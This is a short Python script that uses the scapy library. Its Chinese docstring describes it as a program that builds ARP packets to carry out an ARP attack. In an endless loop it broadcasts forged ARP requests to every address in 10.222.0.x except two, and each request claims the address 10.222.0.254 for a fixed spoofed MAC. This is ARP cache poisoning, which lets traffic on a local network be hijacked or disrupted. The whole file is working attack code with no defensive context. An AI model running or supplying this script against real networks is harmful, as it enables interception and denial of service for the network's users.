#!/usr/bin/env python
# -*- coding:utf-8 -*-
from scapy.layers.l2 import Ether, ARP

_author_ = "liurui"
'''
这是一个通过scapy构建arp包，进行arp攻击的程序
'''
from scapy.all import *  #导入scapy库，buneng使用import scapy.all
ethsrc = '00:0c:34:ef:fd:fe'
ethdst = 'ff:ff:ff:ff:ff:ff'
macsrc = '00:0c:34:ef:fd:fe'
macdst = '00:00:00:00:00:00'
ipsrc = '10.222.0.254'
ifname = 'eth0'
x=0
y=0
eth = Ether(src=ethsrc,dst=ethdst)
#result = sendp(Ether(src=ethsrc,dst=ethdst)/ARP(op=1,hwsrc=macsrc,hwdst=macdst,psrc=ipsrc,pdst=ipdst),iface=ifname)
while y==0:
  if x<254:
   x=x+1
   ipdst='10.222.0.%d' %x
   if ipdst=='10.222.0.86' or ipdst=='10.222.0.248':
     continue
   else:
     sendp(eth/ARP(op=1,hwsrc=macsrc,hwdst=macdst,psrc=ipsrc,pdst=ipdst),iface=ifname,verbose=False)
  else:
   x=1
